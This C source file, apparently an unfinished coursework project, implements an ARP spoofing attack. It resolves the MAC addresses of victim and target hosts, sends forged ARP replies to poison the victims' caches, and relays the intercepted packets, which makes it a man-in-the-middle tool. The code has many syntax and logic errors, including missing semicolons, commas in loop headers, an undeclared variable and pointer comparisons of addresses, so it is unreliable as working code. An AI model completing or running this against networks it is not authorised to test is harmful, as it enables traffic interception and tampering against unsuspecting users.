#include "send_arp.h"




int main(int argc, char *argv[]) {

	/*
	Different steps.
	1. get_ether_addr, get_ip_addr is the same
	2. get each of the sender-target list
	3. 
	*/

	//uint8_t* my_ether still.
	uint8_t my_ether[6]
	uint8_t my_ip[4];
	char errbuf[PCAP_ERRBUF_SIZE];

	// Will go to the function
	uint8_t sender_ether[6];

	//request packet.
	struct rq_packet rq_p;

	// only get once.
	char *dev;

	// have to be many.	uint8_t send_ip[4]; uint8_t target_ip[4];
	struct spoof_list *sp_list;

	// The same.( may be go to the funciton)

	uint8_t broadcast_ether[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

	//step zero.
	if(argc<4) {
		//Should have syntax: send_arp <interface> <send ip> <target ip> <send ip2> <target ip2> ...
		usage(); 
		return -1;
	}
	printf("MY Interface : %s\n", argv[1]);
	// NOTICE.  sender recieves arp reply. 

	// Argc is bigger now.
	// argc cannot be even.
	for(int i = 2; i<argc-1; i=i+2) {
		printf("Sender(victim) IP : %s\n", argv[i]);
		printf("FAKE Target IP : %s\n", argv[i+1]);
	}

	sp_len = (argc-2)/2
	sp_list = (struct spoof_list *)malloc(sp_len * sizeof(struct spoof_list));

	//input each of them in to the list.
	for(int i = 0; i<sp_len; i=i+2) {
		inet_aton(argv[i+2], (in_addr *)sp_list[i].sender_ip_addr);
		inet_aton(argv[i+3], (in_addr *)sp_list[i].target_ip_addr);
	}


	dev = argv[1];
	get_dev_ether_addr(my_ether, dev);
	print_ether(my_ether);
	get_dev_ip_addr(my_ip, dev);
	printf("my ip ");
	print_ip(my_ip);

	pcap_t*	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	if(handle == NULL)  perror("handle null");

	//1,2 send recive ARP
	for(int i = 0, i<sp_len ; i++) {
		//make a new function
		send_recv_arp(handle, &rq_p, sp_list, my_ip, my_ether, i);
//		print_arp(&rq_p);
		sp_list[i].sender_ether_addr = rq_p.eth_header.ether_dhost;
		send_recv_target_arp(handle, &rq_p, sp_list, my_ip, my_ether, i);
		sp_list[i].target_ether_addr = rq_p.eth_header.ether_dhost;
	}


	for(int i = 0, i<sp_len ; i++) {
		printf("Sender ethernet address &d : ", i);
		print_ether(sp_list[i].sender_ether_addr);
	}

	//3. Not yet thread. send ARP reply	
	struct rq_packet rp_p; //reply packet

	for(int i = 0, i<sp_len ; i++) {
		send_arp_rply(handle, &rp_p, sp_list[i].sender_ether_addr, sp_list, my_ether, i);
	}

	//4. redirect
	struct pcap_pkthdr* redir;
	const u_char* packet;

	while(1){
		int res = pcap_next_ex(handle, &redir, &packet);
		//packet info coding - assignment
		//packet -> blabla
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		//ethernet_struct
		struct libnet_ethernet_hdr* tmp_eth = (struct libnet_ethernet_hdr *)packet;

		for(int i = 0, i<sp_len ; i++) {
			//check sender ether addr and target ip addr
			if( tmp_eth->ether_shost != sp_list[i].sender_ether_addr ) continue;
			struct ARP_Header tmp_arp = (struct ARP_Header *)(packet + sizeof(libnet_ethernet_hdr));
			if( tmp_arp->dest_ip_addr != sp_list[i].target_ip_addr ) continue;

			// change source ether_addr to my_ether_addr
			memcpy(tmp_eth->ether_shost, my_ether, 6);
			memcpy(tmp_eth->ether_dhost, sp_list[i].target_ether_addr, 6);
			// send packet to the target
			pcap_sendpacket(handle, &packet, sizeof(packet));
		}
	}

	free(sp_list);
	pcap_close(handle);
	return 0;
}
